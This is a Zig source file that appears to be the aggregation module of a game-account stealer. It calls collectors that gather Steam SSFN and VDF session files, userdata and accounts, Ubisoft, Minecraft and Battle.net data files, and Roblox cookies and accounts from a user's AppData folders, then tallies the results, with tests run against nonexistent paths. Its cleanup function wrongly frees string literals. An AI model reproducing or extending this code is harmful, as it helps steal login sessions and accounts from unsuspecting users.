const std = @import("std");
const steam = @import("steam.zig");
const uplay = @import("uplay.zig");
const minecraft = @import("minecraft.zig");
const battlenet = @import("battlenet.zig");
const roblox = @import("roblox.zig");

pub const Game = struct {
    name: []const u8,
    file_count: usize,
    found: bool,
};

pub const CollectResult = struct {
    games: []const Game,
    steam_result: steam.SteamResult,
    uplay_result: uplay.GameResult,
    minecraft_result: minecraft.GameResult,
    battlenet_result: battlenet.GameResult,
    roblox_result: roblox.GameResult,
};

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming_app_data: []const u8) !CollectResult {
    const steam_result = steam.collect(allocator, local_app_data, roaming_app_data) catch steam.SteamResult{
        .steam_path = null,
        .ssfn_files = &[_][]const u8{},
        .vdf_files = &[_][]const u8{},
        .userdata_dirs = &[_][]const u8{},
        .installed_games = &[_][]const u8{},
        .accounts = &[_]steam.SteamAccount{},
    };
    const uplay_result = uplay.collect(allocator, local_app_data) catch uplay.GameResult{
        .source_path = null,
        .collected_files = &[_][]const u8{},
        .file_count = 0,
    };
    const minecraft_result = minecraft.collect(allocator, roaming_app_data) catch minecraft.GameResult{
        .source_path = null,
        .collected_files = &[_][]const u8{},
        .file_count = 0,
        .launchers_found = &[_][]const u8{},
    };
    const battlenet_result = battlenet.collect(allocator, roaming_app_data, local_app_data) catch battlenet.GameResult{
        .source_path = null,
        .db_files = &[_][]const u8{},
        .config_files = &[_][]const u8{},
        .total_count = 0,
    };
    const roblox_result = roblox.collect(allocator, local_app_data) catch roblox.GameResult{
        .cookie_path = null,
        .accounts = &[_]roblox.RobloxAccount{},
        .app_storage_json = null,
    };

    var games = std.ArrayList(Game).init(allocator);

    try games.append(Game{
        .name = "Steam",
        .file_count = steam_result.vdf_files.len + steam_result.ssfn_files.len + steam_result.userdata_dirs.len,
        .found = steam_result.steam_path != null,
    });
    try games.append(Game{
        .name = "Ubisoft",
        .file_count = uplay_result.file_count,
        .found = uplay_result.source_path != null,
    });
    try games.append(Game{
        .name = "Minecraft",
        .file_count = minecraft_result.file_count,
        .found = minecraft_result.launchers_found.len > 0,
    });
    try games.append(Game{
        .name = "Battle.net",
        .file_count = battlenet_result.total_count,
        .found = battlenet_result.source_path != null,
    });
    try games.append(Game{
        .name = "Roblox",
        .file_count = roblox_result.accounts.len,
        .found = roblox_result.cookie_path != null,
    });

    return CollectResult{
        .games = try games.toOwnedSlice(),
        .steam_result = steam_result,
        .uplay_result = uplay_result,
        .minecraft_result = minecraft_result,
        .battlenet_result = battlenet_result,
        .roblox_result = roblox_result,
    };
}

fn freeCollectResult(result: CollectResult, allocator: std.mem.Allocator) void {
    for (result.games) |g| allocator.free(g.name);
    allocator.free(result.games);
}

const testing = std.testing;

test "collect aggregates all sub-modules" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer freeCollectResult(result, testing.allocator);
    try testing.expectEqual(@as(usize, 5), result.games.len);
    try testing.expectEqualStrings("Steam", result.games[0].name);
    try testing.expectEqualStrings("Ubisoft", result.games[1].name);
    try testing.expectEqualStrings("Minecraft", result.games[2].name);
    try testing.expectEqualStrings("Battle.net", result.games[3].name);
    try testing.expectEqualStrings("Roblox", result.games[4].name);
    for (result.games) |g| {
        try testing.expect(!g.found);
        try testing.expectEqual(@as(usize, 0), g.file_count);
    }
}

test "collect gracefully handles partial failures" {
    const result = collect(testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming") catch unreachable;
    defer freeCollectResult(result, testing.allocator);
    try testing.expectEqual(@as(usize, 5), result.games.len);
}
